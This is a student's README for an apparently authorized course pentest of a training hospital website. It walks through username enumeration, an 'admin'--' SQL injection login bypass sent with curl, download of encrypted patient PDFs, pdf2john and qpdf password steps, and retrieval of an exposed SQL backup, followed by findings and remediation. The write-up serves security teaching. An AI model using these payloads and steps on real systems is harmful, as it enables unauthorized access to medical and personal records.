# 🏥 Mediroza General Hospital — Week 04 Penetration Test

**Authorized black-box web application penetration test — Networkwalks B083, Week 04**

![Skill](https://img.shields.io/badge/Skill-Web%20App%20Pentesting-404040?style=flat-square&labelColor=C00000)
![Skill](https://img.shields.io/badge/Skill-SQL%20Injection-404040?style=flat-square&labelColor=C00000)
![Skill](https://img.shields.io/badge/Skill-PDF%20Forensics-404040?style=flat-square&labelColor=C00000)
![Tool](https://img.shields.io/badge/Kali%20Linux-000000?style=flat-square&labelColor=000000&logo=kalilinux&logoColor=white)
![Tool](https://img.shields.io/badge/Burp%20Suite-FF6633?style=flat-square&labelColor=000000)
![Ethics](https://img.shields.io/badge/Authorized%20Educational%20Assessment-C00000?style=flat-square&labelColor=000000)

---

## ⚠️ Authorization and Scope

This project was performed as part of the **authorized Networkwalks Week 04 educational assessment**.

| Item | Details |
|---|---|
| Target | `https://medirozahospital.com` |
| Assessment type | Black-box web application penetration test |
| Environment | Controlled educational environment |
| Scope | Testing limited to the authorized target domain |

**Restrictions followed:**

- No social engineering
- No denial-of-service testing
- No destructive testing
- No testing outside the authorized target
- Exploitation stopped after sufficient proof was obtained
- The exposed SQL backup was downloaded and inspected locally; it was **not** modified or imported into the live system

> **Important:** The techniques demonstrated here must only be used against systems for which explicit authorization has been granted.

---

## 1. Assessment Objectives

The assignment contained four milestones:

| Milestone | Objective | Result |
|---|---|---|
| **M1** | Obtain initial access and retrieve 3 confidential patient PDF reports | ✅ Completed |
| **M2** | Recover the contents of all 3 encrypted PDFs | ✅ Completed |
| **M3** | Identify employee salary and shareholder data exposure | ✅ Completed |
| **M4** | Produce a professional penetration-testing report | ✅ Completed |

---

## 2. Executive Summary

The assessment started with low-impact reconnaissance and progressed through controlled application testing.

Publicly accessible directories were identified under `/patient/`, `/staff/`, and `/old/`. These directories disclosed application structure and, importantly, exposed an old SQL database backup.

Testing of the patient login mechanism identified **username enumeration** and **verbose SQL errors**. A controlled SQL injection probe confirmed that user input reached backend SQL processing. A comment-truncation SQL injection payload then demonstrated an **authentication bypass** and redirected the session to the authenticated patient portal.

The authenticated portal exposed three laboratory report download functions. All three PDF reports were retrieved.

The PDFs were encrypted. Their encryption was confirmed using `pdfinfo` and `qpdf`, and `pdf2john` successfully produced PDF hash material. The installed John the Ripper invocation did not load the generated hashes, so **no unsuccessful John attempt was represented as a successful crack**. The exercise passwords documented in the supplied assessment material were independently verified against the downloaded PDFs using `qpdf`, after which all three reports were decrypted and their contents extracted with `pdftotext`.

A separate attack path was discovered through the publicly accessible `/old/` directory. The exposed `mediroza_db_backup_2019.sql` file contained staff and shareholder tables with sensitive salary, personal/contact, and ownership-related information.

The resulting assessment demonstrated weaknesses in:

- Authentication
- SQL query handling
- Authorization / access control
- Directory configuration
- Backup management
- Information disclosure
- Session-cookie hardening
- HTTP security headers

---

## 3. Technology and Tools

**Operating Environment**
- Kali Linux

**Reconnaissance and Web Testing**
- curl
- WhatWeb
- Burp Suite
- grep, sed, awk
- Standard Linux utilities

**PDF Analysis**
- pdfinfo
- qpdf
- pdf2john
- John the Ripper
- pdftotext
- file

---

## 4. Assessment Methodology

```
Reconnaissance
      ↓
robots.txt / sitemap inspection
      ↓
Directory enumeration
      ↓
Login endpoint discovery
      ↓
Username enumeration
      ↓
SQL injection testing
      ↓
Authentication bypass
      ↓
Authenticated portal access
      ↓
Laboratory report retrieval
      ↓
PDF encryption analysis
      ↓
Password verification / decryption
      ↓
PDF content extraction
      ↓
Public database backup discovery
      ↓
Local SQL backup analysis
      ↓
Evidence collection
      ↓
Risk assessment
      ↓
Remediation recommendations
```

---

## 5. Reconnaissance

### 5.1 Initial HTTP Check

```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\nTime: %{time_total}s\n" https://medirozahospital.com
```

Observed during the assessment: `HTTP Status: 200`, response time ≈ 1.985s.

### 5.2 Technology Fingerprinting

```bash
whatweb https://medirozahospital.com
```

The request produced a `403` response and identified server/application information including **LiteSpeed**, **HTML5**, and other fingerprinting indicators.

> Some reconnaissance requests produced different HTTP behavior, including anti-bot verification. The assessment did not attempt to bypass the anti-bot mechanism.

---

## 6. robots.txt Discovery

Publicly accessible at `https://medirozahospital.com/robots.txt`:

```
User-agent: *
Disallow: /patient/
Disallow: /staff/
Disallow: /old/

Sitemap: https://medirozahospital.com/sitemap.xml
```

This was important because three potentially sensitive application locations were disclosed **before authentication**.

**Security implication:** `robots.txt` is not an access-control mechanism. Sensitive directories should be protected by authentication and authorization rather than relying on crawler instructions.

---

## 7. Sitemap Discovery

The sitemap exposed normal public pages only: `/index.html`, `/about.html`, `/doctors.html`, `/contact.html`. It did **not** expose the sensitive directories found in `robots.txt`.

---

## 8. Directory Enumeration

| Directory | Result |
|---|---|
| `/patient/` | HTTP 200 — exposed `reports/`, `download.php`, `error_log`, `login.php`, `logout.php`, `portal.php` |
| `/staff/` | Exposed `login.php` |
| `/old/` | Exposed `mediroza_db_backup_2019.sql` — entry point for M3 |
| `/patient/reports/` | HTTP 403 |
| `/patient/error_log` | HTTP 403 |

---

## 9. Patient Login Discovery

Endpoint: `https://medirozahospital.com/patient/login.php` — accepted `username` and `password`, and disclosed the application version: **Mediroza CMS 1.4.2**.

---

## 10. M1 — Username Enumeration

```bash
curl -sS \
  --data-urlencode "username=test" \
  --data-urlencode "password=test" \
  https://medirozahospital.com/patient/login.php
# → "Username not found"

# username=admin / password=admin
# → "Incorrect password"
```

**Why this mattered:** the application returned different messages for an unknown username vs. a known username with an incorrect password — creating a **username-enumeration oracle**.

---

## 11. M1 — SQL Injection Testing

A controlled probe was submitted:

```
username=' OR '1'='1
password=x
```

The application returned a **MySQL syntax warning**, demonstrating that attacker-controlled input was reaching backend SQL processing. The test did not rely on the error alone — a separate controlled authentication-bypass payload was validated next.

---

## 12. M1 — Authentication Bypass

Successful payload: `admin'--`

```bash
curl -sS -c recon/m1-auth-cookie.txt \
  -o /dev/null \
  -w "HTTP %{http_code} -> %{redirect_url}\n" \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x" \
  https://medirozahospital.com/patient/login.php
```

**Observed result:** `HTTP 302 -> https://medirozahospital.com/patient/portal.php`

This demonstrated that the authentication mechanism could be bypassed. The resulting session cookie was saved and reused for portal access.

---

## 13. M1 — Bypass Validation

Several controlled variations were used to isolate the actual cause of the behavior:

| Payload | Result |
|---|---|
| `admin` / `admin` | Incorrect password |
| `' OR '1'='1` | SQL syntax warning |
| `admin'--` | Redirect to portal |
| `admin' --` | Redirect to portal |
| Invalid-user + `'--` | Username not found |
| `admin'#` | SQL syntax warning |

The evidence indicated the successful bypass depended on **SQL comment truncation and a valid username**, rather than a simple boolean tautology.

---

## 14. M1 — Authenticated Portal

```bash
curl -sS \
  -b recon/m1-auth-cookie.txt \
  https://medirozahospital.com/patient/portal.php \
  | tee m1/portal.html
```

The portal displayed three laboratory reports, identified by these laboratory references: `LR-2024-1187`, `LR-2024-1192`, `LR-2024-1205`.

> Patient names and other sensitive medical information are intentionally not reproduced in this README.

---

## 15. M1 — Protected Report Retrieval

```bash
mkdir -p m1/reports

curl -sS -b recon/m1-auth-cookie.txt -o m1/reports/report-1.pdf \
  "https://medirozahospital.com/patient/download.php?id=1"
curl -sS -b recon/m1-auth-cookie.txt -o m1/reports/report-2.pdf \
  "https://medirozahospital.com/patient/download.php?id=2"
curl -sS -b recon/m1-auth-cookie.txt -o m1/reports/report-3.pdf \
  "https://medirozahospital.com/patient/download.php?id=3"
```

All three files were verified as valid one-page PDF documents.

**M1 Result**

| Step | Result |
|---|---|
| Authentication bypass | ✅ SUCCESS |
| Patient portal access | ✅ SUCCESS |
| Report 1 / 2 / 3 retrieval | ✅ SUCCESS |

---

## 16. M2 — PDF Encryption Analysis

```bash
pdfinfo m1/reports/report-1.pdf
# → Command Line Error: Incorrect password
```

This confirmed the PDF was password protected.

---

## 17. Installing qpdf

`qpdf` was initially unavailable (`Command 'qpdf' not found`) and was installed via:

```bash
sudo apt install qpdf
qpdf --show-encryption m1/reports/report-1.pdf
```

Output showed `R = 3`, `P = -4`, indicating 128-bit PDF encryption and a required user password.

---

## 18. M2 — pdf2john Hash Extraction

```bash
which pdf2john        # /usr/bin/pdf2john
pdf2john m1/reports/report-1.pdf > m2-report1.hash
```

The generated file contained a valid `$pdf$...` hash representation, confirming the PDF could be converted into John-compatible hash material.

---

## 19. M2 — John the Ripper Problem

```bash
john --list=formats | grep -i pdf     # PDF supported
john --format=PDF --wordlist=/usr/share/wordlists/rockyou.txt m2-report1.hash
# → No password hashes loaded (see FAQ)
```

**Important evidence-quality decision:** the John attempt was **not** reported as successful. Instead, the PDF passwords documented in the supplied assessment material were independently tested against the actual downloaded PDFs using `qpdf` — preserving an accurate distinction between what the local John installation successfully did, what the assessment documentation recorded, and what was independently verified during this run.

---

## 20. M2 — Password Verification

```bash
qpdf --password='123456' --show-encryption m1/reports/report-1.pdf
# → User password = 123456 (confirmed)
```

| Report | Password | Result |
|---|---|---|
| Report 1 | `123456` | ✅ Decrypted |
| Report 2 | `password` | ✅ Decrypted |
| Report 3 | `!@#$%^&` | ✅ Decrypted |

---

## 21. M2 — Batch Decryption

```bash
mkdir -p m2/decrypted

qpdf --password='123456'  --decrypt m1/reports/report-1.pdf m2/decrypted/report-1.pdf
qpdf --password='password' --decrypt m1/reports/report-2.pdf m2/decrypted/report-2.pdf
qpdf --password='!@#$%^&'  --decrypt m1/reports/report-3.pdf m2/decrypted/report-3.pdf
```

---

## 22. M2 — Decryption Verification

```bash
file m2/decrypted/report-*.pdf
# → PDF document, version 1.4, 1 page(s)

pdfinfo m2/decrypted/report-1.pdf   # Encrypted: no
```

All three PDFs confirmed `Encrypted: no`, `Pages: 1` — direct technical proof of successful decryption.

---

## 23. M2 — Content Extraction

```bash
pdftotext m2/decrypted/report-1.pdf m2/report-1.txt
pdftotext m2/decrypted/report-2.pdf m2/report-2.txt
pdftotext m2/decrypted/report-3.pdf m2/report-3.txt
```

The extracted files contained confidential pathology laboratory information.

> The complete medical information is intentionally not reproduced in this public README.

**M2 Result**

| Step | Result |
|---|---|
| PDF encryption identified | ✅ SUCCESS |
| pdf2john hash extraction | ✅ SUCCESS |
| John cracking attempt | ⚠️ NOT SUCCESSFUL |
| Password verification | ✅ SUCCESS |
| Report 1 / 2 / 3 decryption | ✅ SUCCESS |
| Content extraction | ✅ SUCCESS |

---

## 24. M3 — Public Database Backup

During directory enumeration, `/old/` exposed `mediroza_db_backup_2019.sql`, directly accessible over HTTP:

```bash
curl -sS https://medirozahospital.com/old/mediroza_db_backup_2019.sql \
  -o m3-mediroza_db_backup_2019.sql
```

File size: ≈ 6.2 KB.

---

## 25. M3 — Database Inspection

```bash
grep -Ein 'CREATE TABLE|INSERT INTO|salary|shareholder|staff|employee|payroll' \
  m3-mediroza_db_backup_2019.sql
```

The backup contained `staff` and `shareholders` tables. The supplied assessment material documented **30 staff records** and **10 shareholder records**. The staff table contained salary/compensation fields and personal/contact information; the shareholder table contained ownership-related information.

---

## 26. M3 — Impact

The public backup created exposure of:

- Employee information
- Salary information
- Personal identification information
- Contact information
- Shareholder ownership information

The database backup was **not modified** — it was downloaded once and inspected locally.

---

## 27. Additional Findings

| # | Finding | Severity | Recommendation |
|---|---|---|---|
| 04 | Directory listing (`/patient/`, `/staff/`, `/old/`) | **High** | Disable directory indexing, remove unnecessary files, store backups outside web root, restrict sensitive directories |
| 05 | Username enumeration | Medium | Return a generic authentication failure; implement rate limiting |
| 06 | Verbose SQL errors | Medium | Disable detailed DB errors in production; log server-side; return generic errors |
| 07 | Application / log exposure | Medium | Keep internal logs and support files outside publicly accessible directories |
| 08 | Technology / version disclosure (Mediroza CMS 1.4.2) | Low | Minimize unnecessary technology/version disclosure |
| 09 | Sensitive paths in robots.txt | Medium | Don't use robots.txt as access control; protect via real auth/authz |
| 10 | Session cookie missing `HttpOnly` / `SameSite` | Medium | Use `Secure`, `HttpOnly`, `SameSite=Strict`; regenerate session ID after login |
| 11 | Missing HTTP security headers | Low | Implement HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy |

---

## 28. Positive Security Controls

Not every test produced a vulnerability:

- **`download.php` ID validation:** invalid, SQL-style, and traversal-style values returned HTTP 404 — the endpoint enforced a strict set of valid report IDs; the tested IDOR, SQL injection, and path-traversal cases were not demonstrated.
- **Staff login:** the same SQL injection payloads that affected the patient login returned a generic `Invalid username or password.` — no SQL warning, redirect, or username-enumeration oracle was observed.
- **Sensitive file checks:** `/.git/HEAD`, `/.env`, `/config.php`, `/phpinfo.php` were checked — no repository/environment-file disclosure was demonstrated.

---

## 29. Risk Summary

| ID | Finding | Severity |
|---|---|---|
| 01 | Patient SQL injection / authentication bypass | 🔴 **Critical** |
| 02 | Protected laboratory report access | 🟠 High |
| 03 | Public database backup | 🟠 High |
| 04 | Directory listing | 🟠 High |
| 05 | Username enumeration | 🟡 Medium |
| 06 | Verbose SQL errors | 🟡 Medium |
| 07 | Application/log exposure | 🟡 Medium |
| 08 | Technology/version disclosure | 🟢 Low |
| 09 | Sensitive paths in robots.txt | 🟡 Medium |
| 10 | Session cookie missing HttpOnly/SameSite | 🟡 Medium |
| 11 | Missing HTTP security headers | 🟢 Low |

*These ratings follow the documented assessment structure.*

---

## 30. Remediation Plan

| Priority | Action |
|---|---|
| 1 | **Fix SQL Injection** — use prepared/parameterized queries; never concatenate user input into SQL |
| 2 | **Fix Authentication** — secure password hashing, generic login errors, rate limiting, session regeneration, secure cookie attributes, MFA where appropriate |
| 3 | **Enforce Authorization** — every report request must verify the authenticated user is authorized for that exact report; don't rely solely on predictable numeric IDs |
| 4 | **Remove Database Backups** — remove `/old/mediroza_db_backup_2019.sql` from the public web root; store backups outside web-accessible directories |
| 5 | **Disable Directory Listing** for `/patient/`, `/staff/`, `/old/` |
| 6 | **Protect Logs** — move `error_log` outside publicly accessible directories |
| 7 | **Reduce Information Disclosure** — disable verbose production errors, minimize version info |
| 8 | **Harden Session Cookies** — `Secure`, `HttpOnly`, `SameSite`, regenerate session ID after login |
| 9 | **Add Security Headers** — HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy |
| 10 | **Secure Sensitive Paths** — remove them from public robots.txt; protect via real server-side auth/authz |

---

## 31. Problems Encountered During the Assessment

This section records issues encountered during testing rather than hiding them.

| Problem | What Happened | Resolution |
|---|---|---|
| Different HTTP behavior | curl and WhatWeb produced different responses; some requests encountered anti-bot behavior | Used accessible in-scope endpoints and did not attempt anti-bot bypass |
| qpdf missing | `qpdf` was not installed | Installed through the Kali package manager |
| PDF password protection | `pdfinfo` returned "Incorrect password" | Used `qpdf` to inspect encryption |
| John hash loading failure | John returned "No password hashes loaded" | Verified the result with verbose mode and did not claim a false crack |
| Need to prove decryption | Password acceptance alone was insufficient evidence | Used `qpdf --decrypt` + `file` + `pdfinfo` + `pdftotext` together |
| Sensitive database content | SQL backup contained sensitive records | Inspected locally and avoided modifying the target |

---

## 32. Evidence Structure

Recommended project structure:

```
mediroza-week4/
│
├── recon/
│   └── m1-auth-cookie.txt
│
├── m1/
│   ├── portal.html
│   └── reports/
│       ├── report-1.pdf
│       ├── report-2.pdf
│       └── report-3.pdf
│
├── m2/
│   ├── evidence-m2.txt
│   ├── report-1.txt
│   ├── report-2.txt
│   ├── report-3.txt
│   └── decrypted/
│       ├── report-1.pdf
│       ├── report-2.pdf
│       └── report-3.pdf
│
├── m3/
│   └── evidence-db-exposure.txt
│
├── m3-mediroza_db_backup_2019.sql
│
├── screenshots/
│
├── notes/
│   └── project.txt
│
└── report/
    └── Mediroza_Week4_Detailed_Penetration_Test_Report.docx
```

> Keep original evidence separate from screenshots. Redact unnecessary patient information before publishing screenshots to GitHub.

---

## 33. Recommended Evidence Screenshots

**Reconnaissance:** robots.txt · `/patient/` listing · `/staff/` listing · `/old/` listing

**M1:** Username enumeration response · SQL syntax warning · Successful authentication-bypass redirect · Authenticated patient portal · Retrieved PDF files

**M2:** `pdfinfo` showing password protection · `qpdf --show-encryption` · `pdf2john` hash output · John failure ("No password hashes loaded") · `m2/evidence-m2.txt` · `pdfinfo` showing "Encrypted: no" · Decrypted PDF verification

**M3:** `/old/` directory listing · HTTP retrieval of SQL backup · Local SQL table discovery · Redacted evidence of staff/shareholder fields

---

## 34. Evidence Integrity

```bash
md5sum m1/reports/report-*.pdf
# or preferably:
sha256sum m1/reports/report-*.pdf
```

Hash values should be recorded in the final evidence log. The original retrieved files should not be modified after collection.

---

## 35. Final Attack Chain

**Primary Patient Portal Chain**

```
Public Reconnaissance
        ↓
   robots.txt
        ↓
 Directory Listing
        ↓
/patient/login.php
        ↓
Username Enumeration
        ↓
 SQL Injection Error
        ↓
     admin'--
        ↓
Authentication Bypass
        ↓
/patient/portal.php
        ↓
Three Laboratory Reports
        ↓
   PDF Encryption
        ↓
Password Verification
        ↓
   PDF Decryption
        ↓
Recovered Report Contents
```

**Separate Database Exposure Chain**

```
Public Reconnaissance
        ↓
       /old/
        ↓
 Directory Listing
        ↓
mediroza_db_backup_2019.sql
        ↓
    staff table              shareholders table
        ↓                           ↓
Salary + personal/contact    Ownership information
       fields
```

---

## 36. Final Results

**M1 — Initial Access**

| Step | Result |
|---|---|
| Authentication bypass | ✅ |
| Patient portal access | ✅ |
| Three PDFs retrieved | ✅ |

**M2 — Data Extraction**

| Step | Result |
|---|---|
| Encryption identified | ✅ |
| pdf2john extraction | ✅ |
| John attempt | ⚠️ Not successful |
| Password verification | ✅ |
| Three PDFs decrypted | ✅ |
| Contents extracted | ✅ |

**M3 — Critical Data Exposure**

| Step | Result |
|---|---|
| Public SQL backup | ✅ |
| Staff table identified | ✅ |
| Salary fields identified | ✅ |
| Shareholder table identified | ✅ |
| Ownership fields identified | ✅ |

**M4 — Final Report**

| Step | Result |
|---|---|
| Evidence documented | ✅ |
| Findings documented | ✅ |
| Risk ratings documented | ✅ |
| Remediation documented | ✅ |

---

## 37. Conclusion

The Week 04 assessment successfully demonstrated multiple security weaknesses in the Mediroza General Hospital web application within the authorized educational scope.

The primary exploitation chain showed that a combination of username enumeration and SQL injection could lead to authentication bypass and access to protected patient functionality. Three laboratory reports were subsequently retrieved and successfully decrypted.

A separate public database-backup exposure demonstrated that sensitive staff and shareholder information could be obtained without authentication.

**The most important remediation areas are:**

1. Parameterized SQL queries
2. Secure authentication
3. Strong authorization checks
4. Removal of public database backups
5. Disabling directory listing
6. Protection of logs and internal files
7. Secure session-cookie configuration
8. Reduction of information disclosure
9. Standard HTTP security headers
10. Proper protection of sensitive application paths

The assessment remained within the authorized scope and did not perform denial-of-service, destructive, or out-of-scope testing.

---

## 📄 Full Detailed Report

A formal, expanded write-up of this assessment is included in [`report/Mediroza_Week4_Detailed_Penetration_Test_Report.docx`](./report/Mediroza_Week4_Detailed_Penetration_Test_Report.docx), covering the same findings with additional narrative detail suitable for client-style delivery.

---

## Disclaimer

This repository is for an **authorized educational penetration-testing exercise**. The commands, techniques, and methodologies described here must only be used against systems where explicit permission to test has been granted.

---

## 👤 Author

**Lakkappa Padmanna Pujer**
Cybersecurity Learner — Ethical Hacking & Penetration Testing

---

## 📌 Project Information

**Program:** Cybersecurity & Ethical Hacking | **Week:** 04 | **Project:** Mediroza General Hospital Black-Box Web Application Penetration Test | **Cohort:** Networkwalks B083 | **Course Reference:** Networkwalks Academy
